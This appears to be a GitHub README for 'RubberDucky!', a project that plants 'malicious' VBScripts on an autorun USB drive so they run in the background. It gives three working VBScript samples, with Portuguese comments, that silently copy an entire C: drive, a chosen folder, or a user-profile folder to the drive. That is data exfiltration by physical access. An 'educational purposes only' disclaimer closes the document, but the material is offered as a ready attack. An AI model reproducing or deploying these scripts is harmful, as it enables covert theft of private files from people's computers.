# RubberDucky!
* Copyright :copyright: 2023
* Written by: @caiolz10

### [√] Description :

***Ultimate script to execute malicious script in second-plan with VBScript.***

<p align="center">
<a href="https://github.com/cxiolz/RubberDucky"><img title="GitHub version" src="https://img.shields.io/badge/version-1.0-blue" ></a>  
</p>
<img src="https://raw.githubusercontent.com/cxiolz/RubberDucky/Images/Simple%20HomeMade.jpg">
<p align="center">

### Requirements

 - `USB Pen-Drive`
 
 - `USB AutoRun`

APP         | Installation
-----------|--------------
USB AutoRun      | [Download](https://usb-autorun-creator.softonic.com.br/).

 - `VBScript`
 - `Windows 10 +`

### USAGE 
1. Run the notepad
2. Write a new VBScript 
3. Save the notepad to .VBS
4. Run USB AutoRun
5. Put the Malicious File in your PenDrive
6. It's Done! Now you have a RubberDucky

### TYPES OF MALICIOUS SCRIPT
<h1 align="center">Example</h1>

#### This command will run a copy of all data on the computer
```
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Defina o diretório de origem e destino para a cópia dos dados
strSourceFolder = "C:\"
strDestinationFolder = "D:\Backup"

' Função recursiva para copiar todos os arquivos e subpastas
Sub CopyFolder(strSource, strDestination)
    If Not objFSO.FolderExists(strDestination) Then
        objFSO.CreateFolder(strDestination)
    End If

    Set objFolder = objFSO.GetFolder(strSource)
    Set colFiles = objFolder.Files

    ' Copiar todos os arquivos
    For Each objFile in colFiles
        strFile = objFSO.GetFileName(objFile)
        objFSO.CopyFile objFile.Path, strDestination & "\" & strFile
    Next

    ' Copiar todas as subpastas
    For Each objSubfolder in objFolder.Subfolders
        strSubfolder = objFSO.GetFolderName(objSubfolder)
        CopyFolder objSubfolder.Path, strDestination & "\" & strSubfolder
    Next
End Sub

' Chamar a função para iniciar a cópia
CopyFolder strSourceFolder, strDestinationFolder


```
#### This command will run a copy of a specific folder on the computer
```
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Defina o diretório de origem e destino para a cópia dos dados
strSourceFolder = "C:\Caminho\para\pasta\origem"
strDestinationFolder = "D:\Caminho\para\pasta\destino"

' Verificar se a pasta de origem existe
If objFSO.FolderExists(strSourceFolder) Then
    ' Verificar se a pasta de destino existe, caso contrário, criar
    If Not objFSO.FolderExists(strDestinationFolder) Then
        objFSO.CreateFolder(strDestinationFolder)
    End If

    ' Obter os arquivos da pasta de origem
    Set objFolder = objFSO.GetFolder(strSourceFolder)
    Set colFiles = objFolder.Files

    ' Copiar cada arquivo para a pasta de destino
    For Each objFile in colFiles
        strFile = objFSO.GetFileName(objFile)
        objFSO.CopyFile objFile.Path, strDestinationFolder & "\" & strFile, True
    Next

    WScript.Echo "A cópia de dados foi concluída com sucesso."
Else
    WScript.Echo "A pasta de origem não existe."
End If


```
#### This command will run a copy of a specific folder on the computer inside the currently logged in users folder.

```
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Obter o caminho da pasta de usuários
strUserProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

' Definir o caminho da pasta de origem e destino
strSourceFolder = strUserProfile & "\Caminho\para\pasta\origem"
strDestinationFolder = "D:\Caminho\para\pasta\destino"

' Verificar se a pasta de origem existe
If objFSO.FolderExists(strSourceFolder) Then
    ' Verificar se a pasta de destino existe, caso contrário, criar
    If Not objFSO.FolderExists(strDestinationFolder) Then
        objFSO.CreateFolder(strDestinationFolder)
    End If

    ' Obter os arquivos da pasta de origem
    Set objFolder = objFSO.GetFolder(strSourceFolder)
    Set colFiles = objFolder.Files

    ' Copiar cada arquivo para a pasta de destino
    For Each objFile in colFiles
        strFile = objFSO.GetFileName(objFile)
        objFSO.CopyFile objFile.Path, strDestinationFolder & "\" & strFile, True
    Next

    WScript.Echo "A cópia de dados foi concluída com sucesso."
Else
    WScript.Echo "A pasta de origem não existe."
End If

```

### DISCLAIMER
                                       TO BE USED FOR EDUCATIONAL PURPOSES ONLY

The use of the RubberDucky! is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. 
